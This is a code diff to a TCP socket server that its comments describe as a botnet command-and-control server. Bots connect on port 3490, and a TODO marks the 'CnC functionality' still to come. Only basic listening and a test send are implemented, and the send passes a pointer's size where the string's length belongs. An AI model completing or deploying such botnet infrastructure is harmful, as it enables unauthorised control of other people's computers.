@@ -11,6 +11,7 @@
 #include<arpa/inet.h>
 #include<sys/wait.h>
 #include<signal.h>
+#include "../includes/server.hpp"
 
 #define PORT "3490" // The port the bot machines will connect to
 
@@ -26,7 +27,7 @@ void sigchld_handler(int s) {
 }
 
 // Determine IPv4 or IPv6 (should be IPv4)
-void *get_in_addr(struct sockaddr *socket_address) {
+void* Server::get_in_addr(struct sockaddr *socket_address) {
 	// If address is v4 then return in that context otherwise do v6
 	if (socket_address->sa_family == AF_INET) {
 		return &(((struct sockaddr_in*)socket_address)->sin_addr);
@@ -34,7 +35,7 @@ void *get_in_addr(struct sockaddr *socket_address) {
 	return &(((struct sockaddr_in6*)socket_address)->sin6_addr);
 }
 
-int server_loop() {
+int Server::server_loop() {
 	// Listen on the socket file descriptor, new connections on new_fd
 	int socket_fd, new_fd;
 	struct addrinfo hints, *servinfo, *p; // To avoid memset on global vars
@@ -44,6 +45,7 @@ int server_loop() {
 	int yes = 1;
 	char s[INET6_ADDRSTRLEN];
 	int rv;
+	const void *test_buffer = "Server transmitting";
 
 	memset(&hints, 0, sizeof hints);
 	hints.ai_family = AF_UNSPEC;
@@ -111,8 +113,16 @@ int server_loop() {
 		inet_ntop(bot_addr.ss_family, get_in_addr((struct sockaddr *)&bot_addr), s, sizeof s);
 		printf("received connection from: %s\n", s);
 		// TODO -- Write this to the slave file for later use
+
+		if (!fork()) {
+			close(socket_fd);
+			if (send(new_fd, test_buffer, sizeof(test_buffer), 0) == -1)
+				perror("Send failed");
+			close(new_fd);
+			exit(0);	
+		}
 		
-		// Implement commander functionality here
+		// TODO -- CnC functionality
 		close(new_fd);
 	}
 	return 0;
